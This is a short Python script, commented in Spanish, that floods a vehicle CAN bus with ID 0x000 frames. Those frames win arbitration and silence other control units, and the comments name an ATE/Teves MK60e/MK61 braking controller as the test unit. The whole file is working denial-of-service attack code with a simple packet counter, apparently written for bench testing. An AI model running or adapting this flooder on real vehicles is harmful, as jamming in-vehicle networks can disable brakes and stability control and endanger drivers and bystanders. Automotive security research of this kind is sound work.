#!/usr/bin/env python

# Autor: Alejandro Carballo
# Centralita de pruebas: ATE/TEVES MK60e o MK61
#
# Programa simple para realizar un ataque de denegación de servicio (o DoS) al bus CAN
# Se explota el sistema de arbitraje de CAN utilizando el ID de mayor prioridad (0x000)
# A través de este ID, este paquete gana el arbitraje, y se envía antes que otros
# Al saturar el bus al máximo con este paquete, el resto de IDs no transmiten, o a una frecuencia muy baja

import can
import os
import time

if __name__ == "__main__":
    counterOK = 0
    counterKO = 0
    # bus = can.Bus(interface='socketcan', channel='can0', bitrate=500000)
    # bus = can.Bus(interface='socketcan', channel='slcan0', bitrate=1000000)
    bus = can.Bus(interface='socketcan', channel='can0', bitrate=1000000)
    
    msg = can.Message(arbitration_id=0x0, data=[], is_extended_id=False)
    
    while True:
        try:
            while True:
                bus.send(msg)
                time.sleep(0.0000005)
                counterOK = counterOK + 1
        except can.CanError:
            counterKO = counterKO + 1
            time.sleep(0.000005)
        os.system("clear")
        fail_rate = (counterKO / counterOK) * 100
        print(f"Paquetes lanzados: {counterOK} en bus {bus.channel_info}\nPaquetes con error: {counterKO}")
        print(f"Tasa de fallo {fail_rate:.3f}%")
